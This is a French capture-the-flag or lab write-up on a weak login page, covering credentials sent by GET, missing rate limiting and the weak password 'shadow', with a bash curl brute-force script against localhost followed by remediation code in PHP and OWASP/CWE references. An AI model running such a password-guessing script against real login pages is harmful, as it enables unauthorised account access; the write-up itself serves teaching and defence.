# Brute Force - Weak Authentication

## Description de la faille

La page de login présente plusieurs vulnérabilités permettant une attaque par brute force réussie.

## Vulnérabilités identifiées

### 1. Méthode GET pour l'authentification
Le formulaire utilise la méthode GET au lieu de POST :
```html
<form action="#" method="GET">
```

Les credentials apparaissent dans l'URL :
```
http://localhost:8080/index.php?page=signin&username=admin&password=test&Login=Login
```

**Conséquences :**
- Mot de passe visible dans l'historique du navigateur
- Mot de passe enregistré dans les logs du serveur
- Exposition via les referrer HTTP
- Vulnérable aux attaques de type shoulder surfing

### 2. Absence de rate limiting
Aucune limitation sur le nombre de tentatives de connexion :
- Pas de blocage après X tentatives échouées
- Pas de délai entre les tentatives
- Pas de CAPTCHA
- Permet l'automatisation des attaques

### 3. Weak password
Le mot de passe `shadow` fait partie des mots de passe les plus courants et se trouve dans tous les dictionnaires de brute force.
https://en.wikipedia.org/wiki/List_of_the_most_common_passwords#cite_note-5

## Exploitation

### Script de brute force
```bash
#!/bin/bash

password=(password 123456 12345678 qwerty abc123 monkey 1234567 letmein trustno1 dragon baseball 111111 iloveyou master sunshine ashley bailey passw0rd shadow 123123 654321 superman qazwsx michael Football )


for i in ${password[@]}; do
	curl -X POST "http://localhost:8080/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
done
```

### Résultat

Credentials trouvés :
- Username: `admin`
- Password: `shadow`

Le mot de passe `shadow` est le 2ème dans la liste des mots de passe les plus courants.

## Solution de correction

### 1. Utiliser la méthode POST
```html
<form action="login.php" method="POST">
    <input type="text" name="username">
    <input type="password" name="password">
    <button type="submit">Login</button>
</form>
```

Les données sont envoyées dans le corps de la requête, pas dans l'URL.

### 2. Implémenter un rate limiting

**Exemple en PHP :**
```php
<?php
session_start();

// Initialiser le compteur de tentatives
if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
    $_SESSION['last_attempt'] = time();
}

// Vérifier le nombre de tentatives
if ($_SESSION['login_attempts'] >= 5) {
    $time_passed = time() - $_SESSION['last_attempt'];

    // Bloquer pendant 15 minutes après 5 tentatives
    if ($time_passed < 900) {
        die("Trop de tentatives. Réessayez dans " . (900 - $time_passed) . " secondes.");
    } else {
        // Réinitialiser après 15 minutes
        $_SESSION['login_attempts'] = 0;
    }
}

// Après une tentative échouée
$_SESSION['login_attempts']++;
$_SESSION['last_attempt'] = time();
?>
```

### 3. Ajouter un CAPTCHA

Utiliser Google reCAPTCHA ou un système similaire après 3 tentatives échouées.

### 4. Imposer des mots de passe forts

**Politique de mot de passe :**
- Minimum 12 caractères
- Majuscules + minuscules + chiffres + symboles
- Pas de mots du dictionnaire
- Vérification contre les bases de mots de passe compromis (Have I Been Pwned API)

**Exemple de validation en PHP :**
```php
<?php
function isStrongPassword($password) {
    if (strlen($password) < 12) return false;
    if (!preg_match("/[a-z]/", $password)) return false;
    if (!preg_match("/[A-Z]/", $password)) return false;
    if (!preg_match("/[0-9]/", $password)) return false;
    if (!preg_match("/[^a-zA-Z0-9]/", $password)) return false;

    // Vérifier contre une liste de mots de passe courants
    $common_passwords = ['password', 'shadow', '123456', ...];
    if (in_array(strtolower($password), $common_passwords)) return false;

    return true;
}
?>
```

### 5. Implémenter une authentification multi-facteurs (2FA)

Ajouter une couche de sécurité supplémentaire avec un code envoyé par SMS ou une application d'authentification.

### 6. Monitoring et alertes

- Logger toutes les tentatives de connexion échouées
- Alerter l'administrateur en cas de pattern suspect
- Bloquer automatiquement les IP avec trop de tentatives

## Références

- OWASP: Broken Authentication
- OWASP: Brute Force Attack
- CWE-307: Improper Restriction of Excessive Authentication Attempts
- CWE-521: Weak Password Requirements
```

---

## 📂 Structure du dossier
```
/brute_force_login/
├── flag
└── Resources/
    ├── README.md
    └── bruteforce.sh    (ton script)
